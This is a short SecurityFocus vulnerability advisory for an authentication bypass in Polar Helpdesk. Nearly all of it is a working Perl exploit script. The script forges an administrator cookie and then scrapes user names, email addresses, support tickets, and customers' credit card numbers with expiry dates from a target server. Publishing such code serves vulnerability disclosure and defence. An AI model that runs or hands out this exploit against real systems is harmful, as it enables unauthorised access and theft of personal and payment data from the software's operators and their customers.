source: http://www.securityfocus.com/bid/10775/info

Polar Helpdesk is reported prone to a cookie based authentication system bypass vulnerability. It is reported that the authentication and privilege system for Polar Helpdesk is based entirely on the values read from a cookie that is saved on the client system. An attacker may modify values in the appropriate cookie to gain administrative access to the affected software.

#!/usr/bin/perl
#
# Beyond Security Ltd.
# The below sample will do:
# 1) Grab a user list
# 2) Grab each user's email
# 3) List all available Inbox tickets
# 4) List all tickets with charge on them, and the credit card number and their expiration date

use IO::Socket;
use strict;

my $host = $ARGV[0];
my $base_path = $ARGV[1];

my $remote = IO::Socket::INET->new ( Proto => "tcp",
       PeerAddr => $host,
       PeerPort => "80"
       );

unless ($remote) { die "cannot connect to http daemon on $host" }

print "connected\n";

$remote->autoflush(1);

my $content = "txtPassword=admin&txtEmail=admin\@admin&Submit=Log+in";

my $length = length($content);

my $base_path = $ARGV[1];

print "Get user list\n";

my $data_get_userlist = "GET /$base_path/user/modifyprofiles.asp HTTP/1.1\r\
Host: $host\r\
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8\r\
Connection: close\r\
Cookie: HelpDesk_User=UserType=6&UserID=1;\r\
\r\n";

print $remote $data_get_userlist;
# print $data_get_userlist;

sleep(1);

my @names;
while (<$remote>)
{
 if (/<td>Results /)
 {
  while (/<a href="profileinfo.asp\?ID=([0-9]+)">([^<]+)<\/a>/g)
 {
  my $Item;
  $Item->{ID} = $1;
  $Item->{Name} = $2;
  print "ID: ".$Item->{ID}." Name: ".$Item->{Name}."\n";
  push @names, $Item;
 }
 }
}
close $remote;

print "Get users' email\n";

my $data_get_userdata = "";
foreach my $name (@names)
{
 $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

 unless ($remote) { die "cannot connect to http daemon on $host" }

 $data_get_userdata = "GET /$base_path/user/profileinfo.asp?ID=".$name->{ID}." HTTP/1.1\r\
Host: $host\r\
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8\r\
Connection: close\r\
Cookie: HelpDesk_User=UserType=6&UserID=1;\r\
\r\n";

 print $remote $data_get_userdata;
# print $data_get_userdata;

 sleep(1);

 while (<$remote>)
 {
  if (/name="txtEmail" value="/)
 {
  /name="txtEmail" value="([^"]+)"/;
  print "ID: ".$name->{ID}.", Email: $1\n";
 }
 }
 close($remote);
}

print "Get Inbox tickets\n";

my $data_get_inboxtickets = "GET /$base_path/ticketsupport/Tickets.asp?ID=4 HTTP/1.1\r\
Host: $host\r\
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8\r\
Connection: close\r\
Cookie: HelpDesk_User=UserType=6&UserID=1;\r\
\r\n";

$remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

unless ($remote) { die "cannot connect to http daemon on $host" }

print $remote $data_get_inboxtickets;
#print $data_get_inboxtickets;

sleep(1);

while (<$remote>)
{
 if (/Ticket #/)
 {
# print $_;
  while (/<a href="tickets.asp\?ID=4&Personal=&TicketID=([0-9]+)[^>]+>([^<]+)<\/a>/g)
 {
  print "Ticket ID: $1, Name: $2\n";
 }
 }
}

close($remote);

print "Get billing information\n";

my $data_get_billing = "GET /$base_path/billing/billingmanager_income.asp HTTP/1.1\r\
Host: $host\r\
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8\r\
Connection: close\r\
Cookie: HelpDesk_User=UserType=6&UserID=1;\r\
\r\n";

$remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

unless ($remote) { die "cannot connect to http daemon on $host" }

print $remote $data_get_billing;
sleep(1);

my @tickets;

while (<$remote>)
{
 if (/Ticket No./)
 {
  my $Item;
  /<a href="..\/ticketsupport\/ticketinfo.asp\?ID=([0-9]+)">([^<]+)<\/a>/;
 $Item->{ID} = $1;
 $Item->{Name} = $2;
  print "Ticket ID: ".$Item->{ID}.", Name: ".$Item->{Name}."\n";
  push @tickets, $Item;
 }
}

close($remote);

foreach my $ticket (@tickets)
{
 my $data_get_billingcreditcard = "GET /$base_path/billing/billingmanager_ticketinfo.asp?ID=".$ticket->{ID}." HTTP/1.1\r\
Host: $host\r\
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040405 Firefox/0.8\r\
Connection: close\r\
Cookie: HelpDesk_User=UserType=6&UserID=1;\r\
\r\n";
 $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "80" );

 unless ($remote) { die "cannot connect to http daemon on $host" }

 print $remote $data_get_billingcreditcard;
 sleep(1);
 
 my $Count = 0;
 my $Print = 0;
 while (<$remote>)
 {
  if ($Print)
 {
  $Count ++;
  if ($Count > 1)
  {
   /<td[^>]+>([^<]+)<\/td>/;
   print $1, "\n";
  $Print = 0;
  }
 }
 if (/Expiration date<br>/)
 {
  print "Expiration date: ";
  $Count = 0;
  $Print = 1;
 }
  if (/Credit Card<br>/)
 {
  print "Credit Card: ";
  $Count = 0;
  $Print = 1;
 }
 }
}